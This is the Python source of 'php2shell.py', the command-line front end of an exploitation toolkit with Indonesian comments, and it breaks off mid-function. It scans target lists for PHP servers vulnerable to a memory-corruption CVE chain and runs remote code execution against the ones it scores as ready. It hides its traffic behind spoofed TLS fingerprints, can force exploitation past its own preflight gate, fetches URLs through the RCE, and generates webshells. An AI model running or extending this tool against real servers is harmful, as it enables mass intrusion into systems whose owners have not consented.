"""php2shell.py — SATU CLI untuk deteksi + preflight + exploit + laporan.

Mode:
  scan       baca targets.txt -> detect -> preflight -> (opsional) exploit -> laporan
  detect     satu/lebih URL, deteksi saja (non-destruktif)
  preflight  satu URL, skor kesiapan exploit
  exploit    satu URL, langsung ke mesin rantai internal (READY + konfirmasi)
  shell      panggil shell/safe_shell.py (generator, bukan uploader)

Pagar yang tidak bisa dimatikan:
  - exploit hanya jalan bila READY (tanpa blocker keras) DAN --yes/kofirmasi
  - perintah default `id` (proof-of-access), maksimal 14 byte, tanpa chaining
  - --revshell TIDAK ADA di parser dan diblokir di level runner
  - semua request lewat transport stealth yang sama (JA3 konsisten)

Arsitektur:
  Rantai CVE berjalan IN-PROCESS dari lib/chain.py. Toolkit tidak memanggil
  exploit.py di root repo. Satu-satunya subprocess yang tersisa adalah mode
  `shell`, yang memanggil `shell/safe_shell.py` sebagai generator terpisah.

Pemetaan nama flag penting:
  --ja3              profil sidik jari TLS toolkit ini (chrome/firefox/safari/...)
  --exploit-profile  profil OFFSET mesin rantai (lab|bookworm)

Venv wajib: /home/lota1337/myenv/bin/python
"""

from __future__ import annotations

import argparse
import hashlib
import os
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent         # php2shell/ (repo root)
ROOT = HERE                 # repo baru: shell/ dan docker/ tinggal di sini
sys.path.insert(0, str(HERE))

from lib import banner as banner_mod  # noqa: E402
from lib import advisory as advisory_mod  # noqa: E402
from lib import detect as detect_mod  # noqa: E402
from lib import preflight as preflight_mod  # noqa: E402
from lib import reporter  # noqa: E402
from lib import version as version_mod  # noqa: E402
from lib.exploit_runner import (  # noqa: E402
    DEFAULT_CMD,
    build_command_preview,
    validate_command,
)
from lib.exploit_runner import run as run_exploit  # noqa: E402
from lib.transport import (  # noqa: E402
    DEFAULT_DELAY,
    HAVE_CURL_CFFI,
    PROFILES,
    Transport,
    load_targets,
)

CVE_IDS = banner_mod.CVE_IDS
CVE_CHOICES = ("CVE-2026-109618", "CVE-2026-109619")
# CVE yang rantai PoC-nya sudah diimplementasikan di lib/chain.py.
#
# KOREKSI 2026-10-23: rantai 3-tahap (heap leak -> libphp base -> zif_system
# via pDestructor) adalah CVE-2026-109619, BUKAN 109618. Advisory primer:
#   GHSA-6wmf-4rv5-p3rp = 109619 "stale global state" — producer di request 1,
#   consumer di request 2 pada worker yang sama, lewat session upload progress.
#   Advisory menyebut eksplisit: "With mod_php, both the producing operation
#   and fatal error can occur during multipart startup."
# 109618 "OOM corruption" adalah bug SATU request yang konsumennya shutdown
# procedure; tool ini tidak mengimplementasikannya.
CVE_SUPPORTED = ("CVE-2026-109619",)
VERSION = "1.5.1"


# ---------------------------------------------------------------- banner ----

SHOWN = False  # banner dicetak tepat sekali per proses


def chain_sha256() -> str:
    """sha256 lib/chain.py — mesin rantai yang BENAR-BENAR dipakai.

    Sebelumnya fungsi ini menghitung exploit.py, sisa dari arsitektur lama
    saat toolkit masih memanggil subprocess. Sekarang rantai berjalan
    in-process dari lib/chain.py, jadi yang dicetak harus hash file itu.
    Tanpa ini, banner mencetak hash file yang tidak pernah dieksekusi.
    """
    try:
        with open(os.path.join(HERE, "lib", "chain.py"), "rb") as fh:
            return hashlib.sha256(fh.read()).hexdigest()
    except OSError:
        return ""


def _banner(args=None, mode: str = "", force: bool = False) -> None:
    """Cetak banner SEKALI saja.

    Argparse memanggil formatter untuk `-h` maupun saat error argumen, dan
    itu terjadi di dalam parse_args() — sebelum main() jalan. Tanpa penjaga
    ini banner bisa muncul 2x (sekali dari formatter, sekali dari main),
    seperti yang terjadi pada `scan -u ...` yang salah argumen.
    """
    global SHOWN
    if SHOWN and not force:
        return
    SHOWN = True
    profile = getattr(args, "ja3", None) if args else None
    delay = getattr(args, "delay", None) if args else None
    print(banner_mod.render(
        mode=mode, profile=profile or "", delay=delay or 0.0,
        stealth=HAVE_CURL_CFFI, version=VERSION,
    ))
    sha = chain_sha256()
    if sha:
        print(f"  mesin rantai: lib/chain.py sha256={sha}")
    print()


def _ok(s):    return s
def _warn(s):  return s
def _bad(s):   return s


# ------------------------------------------------------------- helpers ----

def _require_scheme(url: str) -> str:
    """Pastikan URL punya skema http/https SEBELUM apa pun dilakukan.

    Tanpa ini, `exploit -u sibermua.ac.id` diterima dengan tenang, target
    dihubungi, dan baru 3 detik kemudian meledak sebagai ValueError di dalam
    rantai. Pesan errornya benar tapi tempatnya salah: pemakaian keliru harus
    ditolak parser (exit 2), bukan dilaporkan sebagai kegagalan runtime.

    `localhost:8099` sengaja TIDAK diperbaiki otomatis — menebak niat operator
    lebih berbahaya daripada memintanya menulis skema.
    """
    if not url.lower().startswith(("http://", "https://")):
        raise SystemExit(
            f"php2shell: error: URL harus diawali http:// atau https:// "
            f"(didapat: {url!r})"
        )
    return url


def _detect_one(url: str, t: Transport, args) -> dict:
    d = detect_mod.detect(
        url,
        transport=t,
        check_upload_progress=not args.no_upload_progress,
        check_display_errors=not args.no_display_errors,
        check_oom=False if getattr(args, "no_oom", False) else None,
        sapi=getattr(args, "sapi", "auto") or "auto",
    )
    p = preflight_mod.preflight(d)
    return {"url": url, "detect": d.as_dict(), "preflight": p.as_dict()}


def _line(rec: dict) -> str:
    from lib.color import cverdict
    d, p = rec["detect"], rec["preflight"]
    ver = d.get("php_version") or d.get("branch") or "?"
    tag = "READY" if p["ready"] else "  -  "
    tag_c = cverdict("ready") if p["ready"] else tag
    lvl = {"rce": "RCE", "leak": "LEAK", "no": "NO"}.get(
        (p.get("support") or {}).get("level", ""), "?")
    return (
        f"{cverdict(d['verdict']):<10} | {ver:<8} | {lvl:<4} | up={d['upload_progress']:<7} | "
        f"disp={d['display_errors']:<7} | score={p['score']:>2}/{p['max_score']} | {tag_c}"
    )


def _mk_transport(args) -> Transport:
    return Transport(
        profile=args.ja3, delay=args.delay, timeout=args.timeout,
        proxy=args.proxy, audit_log=args.audit,
        verbose=bool(getattr(args, "verbose", False)),
    )


def _exploit_opts(args) -> dict:
    """Parameter rantai yang AKAN dipakai, untuk pratinjau "akan jalan"."""
    return {
        "cve": getattr(args, "cve", None),
        "profile": getattr(args, "exploit_profile", None),
        "zif_offset": getattr(args, "zif_offset", None),
        "dtor_offset": getattr(args, "dtor_offset", None),
        "htdata_offset": getattr(args, "htdata_offset", None),
        "huge_mb": getattr(args, "huge_mb", None),
        "retries": getattr(args, "retries", None),
        "fetch": getattr(args, "fetch", None),
    }


def _add_exploit_flags(p: argparse.ArgumentParser, single: bool) -> None:
    """Flag mesin rantai internal (lib/chain.py)."""
    g = p.add_argument_group("opsi mesin rantai (lib/chain.py, internal)")
    g.add_argument("--cve", choices=CVE_CHOICES, default="CVE-2026-109619",
                   help=("CVE yang ditembak (default %(default)s). "
                         "109618 tidak diimplementasikan tool ini"))
    g.add_argument("-c", "--cmd", default=DEFAULT_CMD,
                   help=f"perintah proof (default {DEFAULT_CMD!r}, maks 14 byte, tanpa chaining)")
    g.add_argument("--allow-cmd", action="append", default=None, metavar="CMD",
                   help=("tambah perintah proof di luar default (id, whoami). "
                         "Pilihan: uname, hostname, pwd, ls, cat, df, uptime, "
                         "who, w, env. Berulang: --allow-cmd ls --allow-cmd df. "
                         "sh/bash/nc/curl/wget selamanya diblokir."))
    g.add_argument("--exploit-timeout", type=int, default=300,
                   help="timeout per exploit, detik (default 300)")
    g.add_argument("--zif-offset", default=None,
                   help="offset zif_system, mis. 0x465370 (default: profil)")
    g.add_argument("--dtor-offset", default=None,
                   help="offset zend_hash_destroy, mis. 0x65eb60")
    g.add_argument("--htdata-offset", default=None,
                   help="offset hash table data")
    g.add_argument("--offsets-file", default="",
                   help="file profil offset; '' = jangan pakai profil lab (default '')")
    g.add_argument("--no-auto-offsets", action="store_true",
                   help="jangan cari offset otomatis")
    g.add_argument("--exploit-profile", choices=("lab", "bookworm"), default=None,
                   help="profil offset exploit.py (BUKAN sidik jari TLS)")
    g.add_argument("--huge-mb", type=int, default=None,
                   help="paksa ukuran field 'big' (MB); default: dibaca otomatis "
                        "dari memory_limit target")
    g.add_argument("--fetch", default=None,
                   help="URL yang di-fetch lewat RCE setelah eksekusi")
    g.add_argument("--retries", type=int, default=None,
                   help="jumlah retry per tahap (default upstream 3)")
    g.add_argument("--no-pre-rotate", action="store_true",
                   help="jangan rotate worker sebelum preflight")
    g.add_argument("--no-retry-rotate", action="store_true",
                   help="jangan rotate worker saat retry")
    g.add_argument("--proof-file", default=None, metavar="NAME",
                   help=("tulis bukti ke /out/NAME di target lalu bacakan "
                         "(setara -c 'id>/out/NAME'; nama: huruf/angka/_/-, maks 24)"))
    g.add_argument("--output-file", default=None,
                   help="file output exploit.py (-o/--output)")
    g.add_argument("--quiet", action="store_true",
                   help="perkecil output exploit.py (-q)")
    if not single:
        g.add_argument("--threads", type=int, default=None,
                       help="threads exploit.py per target (default upstream 5)")


# ---------------------------------------------------------------- modes ----

def cmd_detect(args) -> int:
    t = _mk_transport(args)
    urls = args.urls or load_targets(args.list)
    if not urls:
        print("tidak ada target", file=sys.stderr)
        return 2
    records = []
    from lib.color import cverdict
    for u in urls:
        rec = _detect_one(u, t, args)
        records.append(rec)
        d = rec["detect"]
        print(f"  {cverdict(d['verdict']):<10} {d['url']}")
        if d["reason"]:
            print(f"             {d['reason']}")
        for s in d["signals"]:
            print(f"             + {s}")
        if d["error"]:
            print(f"             ! {d['error']}")
    t.close()
    print()
    print(reporter.table(records))
    print()
    print(reporter.summary(records))
    if args.json:
        print(f"json: {reporter.write_json(args.json, records, {'mode': 'detect', 'cve': CVE_IDS})}")
    if args.csv:
        print(f"csv : {reporter.write_csv(args.csv, records)}")
    return 0


def cmd_preflight(args) -> int:
    t = _mk_transport(args)
    url = _require_scheme(args.urls[0])
    rec = _detect_one(url, t, args)
    t.close()
    d, p = rec["detect"], rec["preflight"]
    from lib.color import cverdict, keyword
    print(f"URL          : {url}")
    print(f"verdict      : {cverdict(d['verdict'])} — {d['reason']}")
    print(f"PHP          : {d['php_version'] or 'tidak bocor'} (branch {d['branch'] or '?'})")
    print(f"upload_prog  : {d['upload_progress']}")
    print(f"display_err  : {d['display_errors']}")
    print()
    for k, v in p["checks"].items():
        print(f"  {k:<15}: {v}")
    print()
    for b in p["blockers"]:
        print(f"  {keyword('BLOCKER', 'bad')}: {b}")
    for n in p["notes"]:
        print(f"  catatan: {n}")
    print()
    print(f"skor         : {p['score']}/{p['max_score']}")
    sup = p.get("support") or {}
    lvl_label = {"rce": "RCE", "leak": "LEAK SAJA", "no": "BELUM TERBUKTI",
                 "unknown": "TIDAK DIKETAHUI"}.get(sup.get("level", ""), "?")
    print(f"dukungan     : {lvl_label}")
    if sup.get("text"):
        print(f"               {sup['text']}")
    print(f"siap exploit : {keyword('YA', 'bad') if p['ready'] else keyword('TIDAK', 'ok')}")
    if args.json:
        print(f"json: {reporter.write_json(args.json, [rec], {'mode': 'preflight', 'cve': CVE_IDS})}")
    return 0


def _confirm(n: int, args) -> bool:
    if getattr(args, "yes", False):
        return True
    if not sys.stdin.isatty():
        return False
    try:
        ans = input(f"Jalankan exploit pada {n} target? [y/N] ")
    except EOFError:
        return False
    return ans.strip().lower() in ("y", "ya", "yes")


def _run_exploits(candidates: list[dict], args) -> None:
    # whitelist runtime: default id/whoami; --allow-cmd menambah (bounded)
    try:
        from lib.exploit_runner import set_allowed_cmds
        wl = set_allowed_cmds(getattr(args, "allow_cmd", None))
        if getattr(args, "allow_cmd", None):
            print(f"  whitelist proof: {', '.join(wl)}")
    except ValueError as e:
        for r in candidates:
            r["exploit"] = {"success": False, "error": str(e)}
        print(f"  {e}")
        return

    # --proof-file NAME → cmd `id>/out/NAME`. Dulu flag ini hanya deklarasi
    # argparse tanpa efek: cmd tetap 'id', proof_mode=False, hasil selalu
    # BLIND. Sekarang ia benar-benar membentuk perintah proof + kanal baca.
    cmd = args.cmd
    proof_name = getattr(args, "proof_file", None)
    if proof_name:
        try:
            from lib.exploit_runner import proof_cmd_for
            cmd = proof_cmd_for(args.cmd, proof_name)
        except ValueError as e:
            for r in candidates:
                r["exploit"] = {"success": False, "error": str(e)}
            print(f"  {e}")
            return
        args.cmd = cmd

    why = validate_command(cmd)
    if why:
        for r in candidates:
            r["exploit"] = {"success": False, "error": why}
        print(f"  {why}")
        return

    print()
    for r in candidates:
        print("  " + build_command_preview(
            r["url"], args.cmd, opts=_exploit_opts(args),
        ))
    print()

    for r in candidates:
        print(f"  -> {r['url']}  cmd={args.cmd!r}", flush=True)
        try:
            res = run_exploit(
                r["url"], cmd=args.cmd,
                cve=args.cve,
                profile=args.exploit_profile or "bookworm",
                zif_offset=args.zif_offset,
                dtor_offset=args.dtor_offset,
                htdata_offset=args.htdata_offset,
                huge_mb=args.huge_mb,
                retries=args.retries or 3,
                no_pre_rotate=args.no_pre_rotate,
                no_retry_rotate=args.no_retry_rotate,
                fetch=args.fetch or "",
                proof_file=proof_name,
                timeout=args.timeout or 15.0,
                max_total_timeout=args.exploit_timeout,
                quiet=not args.verbose,
                log=(lambda m: print(f"     {m}", flush=True)),
            )
        except RuntimeError as e:
            # Kegagalan pra-syarat (mis. post_max_size terlalu kecil) bukan
            # crash: laporkan sebagai hasil, jangan buang traceback ke operator.
            r["exploit"] = {"success": False, "error": str(e)}
            print(f"     gagal (0.0s): {e}")
            continue
        r["exploit"] = res.as_dict()
        tag = "PROOF" if res.success else "gagal"
        msg = res.proof or res.error or f"rc={res.returncode}"
        print(f"     {tag} ({res.duration:.1f}s): {msg}")


def cmd_scan(args) -> int:
    # `-l` wajib, tapi divalidasi DI SINI (bukan required=True di argparse)
    # supaya user yang mengetik `scan -u <url>` dapat arahan yang berguna,
    # bukan "error: the following arguments are required: -l/--list".
    if not args.list:
        if getattr(args, "urls", None):
            print("scan menerima DAFTAR file, bukan URL langsung.", file=sys.stderr)
            print("  untuk satu URL:  php2shell.py detect -u <url>", file=sys.stderr)
            print("  untuk exploit:   php2shell.py exploit -u <url>", file=sys.stderr)
            print("  untuk banyak:    tulis URL ke file lalu scan -l file.txt", file=sys.stderr)
        else:
            print("scan butuh -l <file.txt> (satu URL per baris).", file=sys.stderr)
            print("  contoh: php2shell.py scan -l targets.txt", file=sys.stderr)
        return 2

    urls = load_targets(args.list)
    if not urls:
        print(f"file {args.list} tidak menghasilkan target", file=sys.stderr)
        return 2

    print(f"target : {len(urls)} entri dari {args.list}")
    print(f"exploit: {'AKAN dijalankan (target READY saja)' if args.exploit else 'tidak — detect saja'}")
    print()

    t = _mk_transport(args)
    records: list[dict] = []
    for i, u in enumerate(urls, 1):
        print(f"[{i}/{len(urls)}] {u}", flush=True)
        rec = _detect_one(u, t, args)
        records.append(rec)
        print(f"          {_line(rec)}")
        if rec["detect"]["reason"]:
            print(f"          {rec['detect']['reason']}")
    t.close()

    if args.exploit:
        candidates = [r for r in records if r["preflight"]["ready"]]
        print()
        print(f"kandidat siap-exploit: {len(candidates)}")
        if not candidates:
            print("tidak ada target yang memenuhi syarat — exploit dilewati")
        elif not _confirm(len(candidates), args):
            print("DIBATALKAN — tidak ada exploit dijalankan (pakai --yes untuk non-interaktif)")
            for r in candidates:
                r["exploit"] = {"success": False, "error": "dibatalkan pengguna"}
        else:
            _run_exploits(candidates, args)

    out_json = args.json or str(HERE / "out" / "scan.json")
    out_csv = args.csv or str(HERE / "out" / "scan.csv")
    pj = reporter.write_json(out_json, records, {
        "mode": "scan",
        "cve": args.cve,
        "version": VERSION,
        "targets_file": str(args.list),
        "ja3": args.ja3,
        "exploit_profile": args.exploit_profile,
        "delay": args.delay,
        "exploit_requested": bool(args.exploit),
        "exploit_cmd": args.cmd if args.exploit else None,
        "chain_engine": "lib/chain.py (internal)",
        "generated": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
    })
    pc = reporter.write_csv(out_csv, records)

    print()
    print(reporter.table(records))
    print()
    print(reporter.summary(records))
    print()
    print(f"json: {pj}")
    print(f"csv : {pc}")
    return 0


def cmd_exploit(args) -> int:
    """Satu URL, langsung ke mesin rantai internal (lib/chain.py).

    Tetap butuh READY + konfirmasi. Tidak ada subprocess, tidak memanggil
    exploit.py di root repo.
    """
    url = _require_scheme(args.urls[0])

    # Validasi perintah HARUS paling awal. Kalau ditaruh setelah gate target,
    # target yang tidak terjangkau akan menolak duluan dan `-c 'id; uname -a'`
    # lolos tanpa pernah diperiksa — pagar jadi bergantung pada jaringan.
    # --allow-cmd diterapkan duluan supaya whitelist runtime final yang divalidasi.
    try:
        from lib.exploit_runner import set_allowed_cmds
        set_allowed_cmds(getattr(args, "allow_cmd", None))
    except ValueError as e:
        print(f"URL      : {url}")
        print(str(e))
        print("batal    : perintah proof ditolak sebelum apa pun dikirim")
        return 2
    why = validate_command(getattr(args, "cmd", DEFAULT_CMD))
    if why:
        print(f"URL      : {url}")
        print(f"{why}")
        print("batal    : perintah proof ditolak sebelum apa pun dikirim")
        return 2

    t = _mk_transport(args)
    rec = _detect_one(url, t, args)
    t.close()
    d, p = rec["detect"], rec["preflight"]
    print(f"URL      : {url}")
    print(f"verdict  : {d['verdict']} — {d['reason']}")
    print(f"skor     : {p['score']}/{p['max_score']}  ({'READY' if p['ready'] else 'TIDAK SIAP'})")
    for b in p["blockers"]:
        print(f"  BLOCKER: {b}")
    print()

    force = getattr(args, "force", False)

    # Ditolak: jangan pernah mencetak "akan jalan". Baris itu hanya bermakna kalau
    # perintah MEMANG akan dieksekusi; kalau dicetak setelah DITOLAK, user melihat
    # perintah yang seolah berjalan padahal sudah dibatalkan (menyesatkan).
    if not p["ready"] and not force:
        print("DITOLAK — target tidak memenuhi pra-syarat; pakai --force untuk memaksa")
        print(f"batal    : tidak ada yang dikirim ke {url}")
        print("kurang   : " + (", ".join(p["blockers"]) if p["blockers"] else "pra-syarat lain"))
        return 1

    # Akan dieksekusi (READY, atau dipaksa dengan --force): tampilkan argv persisnya
    # supaya user bisa membandingkan "yang ditampilkan" dengan "yang dikirim".
    preview = build_command_preview(
        rec["url"], cmd=getattr(args, "cmd", DEFAULT_CMD),
        opts=_exploit_opts(args),
    )
    if force and not p["ready"]:
        print("DIPAKSA — pra-syarat tidak terpenuhi, atas permintaan --force")
    print(f"akan jalan: {preview}")
    print()

    if not _confirm(1, args):
        print("DIBATALKAN — tidak ada exploit dijalankan (pakai --yes)")
        return 1

    _run_exploits([rec], args)
    res = rec.get("exploit", {})
    print()
    from lib.color import cverdict, keyword
    proof_txt = res.get("proof") or "-"
    err_txt = res.get("error") or "-"
    if res.get("success"):
        print(f"proof : {keyword(proof_txt, 'ok')}")
        print(f"error : -")
    else:
        print(f"proof : {proof_txt}")
        print(f"error : {cverdict(err_txt) if err_txt != '-' else '-'}")
    if args.json:
        print(f"json: {reporter.write_json(args.json, [rec], {'mode': 'exploit', 'cve': args.cve, 'chain_engine': 'lib/chain.py (internal)'})}")
    return 0 if res.get("success") else 1


def cmd_shell(args) -> int:
    gen = ROOT / "shell" / "safe_shell.py"
    if not gen.exists():
        print(f"tidak ada {gen}", file=sys.stderr)
        return 2
    argv = [sys.executable, str(gen), "--out", args.out, "--ttl", str(args.ttl)]
    if args.commands:
        argv += ["--commands", args.commands]
    if args.author:
        argv += ["--author", args.author]
    if args.purpose:
        argv += ["--purpose", args.purpose]
    return subprocess.run(argv).returncode


def cmd_version(args) -> int:
    """Cek versi tools ini vs rilis terbaru di GitHub.

    Exit code: 0 = sudah terbaru / tidak bisa dicek (bukan kegagalan pakai),
    10 = ada versi lebih baru (skrip CI bisa pakai ini sebagai gate).
    """
    vc = version_mod.check(
        VERSION,
        use_cache=not getattr(args, "no_cache", False),
    )
    if getattr(args, "advisories", False):
        print(advisory_mod.describe())
        print()
    mark = {"current": "[OK]  ", "behind": "[BARU]", "ahead": "[DEV] ", "unknown": "[?]   "}[vc.status]
    print(f"{mark} lokal   : {vc.local}")
    print(f"      remote  : {vc.remote or '-'}" + (f"  (sumber: {vc.remote_source})" if vc.remote_source else ""))
    print(f"      status  : {vc.status}")
    print(f"      pesan   : {vc.message}")
    print(f"      repo    : {vc.url}")
    if vc.update_available:
        print("\n  cara update:")
        print(f"    git -C {ROOT} pull --ff-only")
        print(f"    atau unduh: {vc.url}/archive/refs/heads/main.tar.gz")

    if getattr(args, "json", None):
        import json as _json

        p = Path(args.json)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(_json.dumps(vc.as_dict(), indent=2, ensure_ascii=False), encoding="utf-8")
        print(f"\n  json -> {p}")

    return 10 if vc.update_available else 0


# --------------------------------------------------------------- parser ----

class BannerHelp(argparse.RawDescriptionHelpFormatter):
    """Help yang selalu diawali ASCII banner — termasuk untuk `-h`.

    Dua hal yang HARUS ditimpa:
      format_help()  -> untuk `-h` / `--help`
      format_usage() -> untuk pesan error argparse ("usage: ...").

    Tanpa format_usage(), `usage:` ternoda karena prog-nya ikut berisi
    banner: "usage:  ____  _   _ ____ ...". Itu bug yang terlihat di
    `php2shell.py scan -u ...` (scan butuh -l, bukan -u).
    """

    def format_usage(self) -> str:
        return super().format_usage()

    def format_help(self) -> str:
        return (banner_mod.render(mode="", version=VERSION) + "\n"

                + banner_mod.GUARDS_TEXT + "\n"
                + super().format_help())


class SubHelp(argparse.RawDescriptionHelpFormatter):
    """Help subcommand (scan/detect/...) — TANPA banner, TANPA pagar.

    Alasannya: `scan --help` dipanggil untuk membaca flag, bukan untuk
    melihat identitas tool. Banner 12 baris di sini hanya mendorong daftar
    flag ke luar layar.
    """

    pass


def cmd_builds(args) -> int:
    """Tampilkan tabel build yang didukung. Read-only, tidak menyentuh jaringan."""
    from lib import build_support as bs

    rows = bs.table_rows()
    if getattr(args, "level", None):
        rows = [r for r in rows if r["level"] == args.level]

    label = {"rce": "RCE", "leak": "LEAK", "no": "NO"}
    print(f"  {'PHP':<9} {'arch':<9} {'dukungan':<9} catatan")
    print(f"  {'-'*9} {'-'*9} {'-'*9} {'-'*45}")
    for r in rows:
        print(f"  {r['version']:<9} {r['arch']:<9} {label[r['level']]:<9} {r['note']}")
    print()
    n_rce = sum(1 for r in bs.table_rows() if r["level"] == "rce")
    n_leak = sum(1 for r in bs.table_rows() if r["level"] == "leak")
    n_no = sum(1 for r in bs.table_rows() if r["level"] == "no")
    print(f"  total {len(bs.table_rows())} build: {n_rce} RCE, {n_leak} leak-saja, {n_no} belum terbukti")
    print("  RCE = stage 1-3 terbukti (perintah benar-benar jalan).")
    print("  LEAK = hanya bocoran alamat; stage 3 tidak jalan, perintah TIDAK dieksekusi.")
    print("  NO = belum pernah terbukti. Bukan berarti mustahil, tapi jangan diandalkan.")
    print("  Sumber: devploit/php2shell (13 profil), 9bie/php2shell-bypass-aslr-exp, lab lokal.")

    if getattr(args, "json", None):
        import json as _json
        p = Path(args.json)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(_json.dumps(
            {"builds": bs.table_rows(), "total": len(bs.table_rows()),
             "counts": {"rce": n_rce, "leak": n_leak, "no": n_no}},
            indent=2, ensure_ascii=False), encoding="utf-8")
        print(f"\n  json -> {p}")
    return 0


def build_parser() -> argparse.ArgumentParser:
    # Flag global memakai parser induk supaya bisa ditaruh SEBELUM **atau**
    # SESUDAH subcommand. Tanpa ini, `scan -l x.txt --json out.json` gagal
    # dengan "unrecognized arguments" — jebakan argparse yang membingungkan.
    common = argparse.ArgumentParser(add_help=False, formatter_class=BannerHelp)
    common.add_argument("--ja3", default="chrome", choices=sorted(PROFILES),
                        help="profil sidik jari TLS (default: chrome)")
    common.add_argument("--delay", type=float, default=DEFAULT_DELAY,
                        help=f"jeda antar-request detik + jitter (default: {DEFAULT_DELAY})")
    common.add_argument("--timeout", type=int, default=15, help="timeout HTTP detik (default: 15)")
    common.add_argument("--proxy", default=None, help="proxy http(s), mis. http://127.0.0.1:8080")
    common.add_argument("--audit", default=None, help="tulis audit JSONL ke file ini")
    common.add_argument("--no-upload-progress", action="store_true", help="lewati probe upload_progress")
    common.add_argument("--no-oom", action="store_true",
                        help="lewati OOM probe aktif (default: otomatis hanya bila verdict unknown/eol)")
    common.add_argument("--sapi", default="auto", choices=["auto", "fpm", "mod_php"],
                        help="gating sinyal OOM probe: auto (gabungan, default) | fpm | mod_php")
    common.add_argument("--no-color", action="store_true",
                        help="matikan warna output (sekadar: auto-mati bila bukan TTY / NO_COLOR)")
    common.add_argument("--no-display-errors", action="store_true", help="lewati probe display_errors")
    common.add_argument("--json", default=None, help="path output JSON")
    common.add_argument("--csv", default=None, help="path output CSV")
    common.add_argument("-v", "--verbose", action="store_true", help="tampilkan setiap request")
    common.add_argument("--check-version", action="store_true",
                        help="cek versi terbaru di GitHub sebelum menjalankan mode")

    ap = argparse.ArgumentParser(
        prog="php2shell",
        parents=[common],
        description=f"Toolkit terpadu {CVE_IDS} — deteksi, preflight, exploit, laporan.",
        # allow_abbrev=False WAJIB: tanpa ini `-c id` disangka singkatan
        # `--csv`, dan `--cve` bertabrakan dengan `--csv`. Argparse lalu
        # menolak "unrecognized arguments: -c id" — membingungkan karena
        # help sendiri menampilkan `-c`.
        allow_abbrev=False,
        epilog=("contoh:\n"
                "  php2shell.py scan -l targets.txt\n"
                "  php2shell.py scan -l targets.txt --exploit --yes --cmd id\n"
                "  php2shell.py scan -l targets.txt --zif-offset 0x465370 --dtor-offset 0x65eb60\n"
                "  php2shell.py detect -u https://host/\n"
                "  php2shell.py preflight -u https://host/\n"
                "  php2shell.py exploit -u https://host/ --yes\n"
                "  php2shell.py shell --out shell/out --ttl 72\n"),
        formatter_class=BannerHelp,
    )

    sub = ap.add_subparsers(dest="mode", help="mode kerja")
    s = sub.add_parser("scan", parents=[common], formatter_class=SubHelp, prog="php2shell scan",
                       help="scan daftar target dari file .txt",
                       epilog=("contoh:\n"
                               "  php2shell.py scan -l targets.txt\n"
                               "  php2shell.py scan -l targets.txt --exploit --yes\n"
                               "\n"
                               "untuk SATU url pakai: php2shell.py detect -u https://host/\n"
                               "atau:                 php2shell.py exploit -u https://host/\n"))
    s.add_argument("-l", "--list", help="file .txt, satu URL per baris (wajib)")
    # -u diterima HANYA untuk memberi pesan yang berguna, bukan untuk scan.
    # Tanpa ini user mengira `scan -u <url>` didukung, lalu tertahan oleh
    # error "required: -l/--list" yang tidak menjelaskan apa pun.
    s.add_argument("-u", "--urls", nargs="+", help=argparse.SUPPRESS)
    s.add_argument("--exploit", action="store_true", help="lanjut eksploitasi target READY")
    s.add_argument("--yes", action="store_true", help="konfirmasi non-interaktif")
    _add_exploit_flags(s, single=False)

    d = sub.add_parser("detect", parents=[common], formatter_class=SubHelp, prog="php2shell detect", help="deteksi satu/lebih URL")
    d.add_argument("-u", "--urls", nargs="+", help="URL target")
    d.add_argument("-l", "--list", help="atau file .txt")

    p = sub.add_parser("preflight", parents=[common], formatter_class=SubHelp, prog="php2shell preflight", help="skor kesiapan exploit satu URL")
    p.add_argument("-u", "--urls", nargs=1, required=True)

    e = sub.add_parser("exploit", parents=[common], formatter_class=SubHelp, prog="php2shell exploit", help="eksploitasi satu URL (READY + konfirmasi)")
    e.add_argument("-u", "--urls", nargs=1, required=True)
    e.add_argument("--yes", action="store_true", help="konfirmasi non-interaktif")
    e.add_argument("--force", action="store_true", help="paksa walau preflight TIDAK siap")
    _add_exploit_flags(e, single=True)

    sh = sub.add_parser("shell", parents=[common], formatter_class=SubHelp, prog="php2shell shell", help="generate webshell berpassword (folder shell/)")
    sh.add_argument("--out", default="shell/out")
    sh.add_argument("--ttl", type=int, default=72)
    sh.add_argument("--commands", default=None)
    sh.add_argument("--author", default=None)
    sh.add_argument("--purpose", default=None)

    vp = sub.add_parser("version", parents=[common], formatter_class=SubHelp, prog="php2shell version",
                        help="cek versi tools ini vs rilis terbaru di GitHub",
                        epilog=("contoh:\n"
                                "  php2shell.py version\n"
                                "  php2shell.py version --json out/version.json\n"))
    vp.add_argument("--no-cache", action="store_true", help="abaikan cache 1 jam, cek ulang ke GitHub")
    vp.add_argument("--advisories", action="store_true",
                    help="tampilkan fakta pasca-rilis: CVE ketiga, patch di-build ulang, peringatan mitigasi")

    bp = sub.add_parser("builds", parents=[common], formatter_class=SubHelp, prog="php2shell builds",
                        help="tabel build PHP yang didukung: RCE / leak-saja / belum terbukti",
                        epilog=("contoh:\n"
                                "  php2shell.py builds\n"
                                "  php2shell.py builds --level rce\n"
                                "  php2shell.py builds --json out/builds.json\n"))
    bp.add_argument("--level", choices=["rce", "leak", "no"], default=None,
                    help="saring per tingkat dukungan")
    return ap


def main(argv: list[str] | None = None) -> int:
    ap = build_parser()
    argv = list(sys.argv[1:] if argv is None else argv)

    # --version / -V ditangani SEBELUM argparse.
    # Alasan: dengan formatter BannerHelp, action="version" bawaan argparse
    # ikut memanggil format_help() sehingga banner penuh tercetak dan output
    # tidak lagi satu baris (tidak skripable). Menanganinya di sini membuat
    # perilakunya pasti: satu baris, exit 0, baik di top-level maupun setelah
    # subcommand (`scan --version`).
    if any(a in ("--version", "-V") for a in argv):
        floors = "/".join(banner_mod.FIX_FLOOR[b] for b in sorted(banner_mod.FIX_FLOOR))
        print(f"php2shell {VERSION}  {CVE_IDS}  fix-floor: {floors}")
        return 0

    # Tanpa argumen: tampilkan splash, bukan error argparse yang kaku.
    if not argv:
        print(banner_mod.splash())
        return 0

    args = ap.parse_args(argv)
    if not args.mode:
        print(banner_mod.splash())
        return 0

    # warna: --no-color mematikan; jika tidak, auto (TTY + NO_COLOR+hormat)
    if getattr(args, "no_color", False):
        from lib import color as _color
        _color.enable(False)

    # Gagal cepat: jangan biarkan pengguna menunggu rantai panjang untuk CVE
    # yang TIDAK diimplementasikan tool ini. Exit 2 karena ini kesalahan
    # pemakaian, bukan runtime.
    cve = getattr(args, "cve", None)
    if cve and cve not in CVE_SUPPORTED:
        ap.error(
